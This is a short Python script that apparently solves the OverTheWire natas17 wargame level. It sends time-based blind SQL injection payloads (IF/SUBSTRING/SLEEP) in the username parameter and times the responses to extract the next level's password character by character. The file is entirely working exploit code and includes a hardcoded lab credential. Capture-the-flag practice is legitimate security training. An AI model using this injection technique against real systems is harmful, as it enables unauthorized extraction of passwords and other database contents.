import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

chars = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
    for c in chars:
        payload = f'natas18" AND IF(SUBSTRING(password,{i},1)="{c}", SLEEP(3), 0) -- '
        
        start = time.time()
        requests.get(url, auth=auth, params={"username": payload})
        end = time.time()
        
        if end - start > 2.5:
            password += c
            print(password)
            break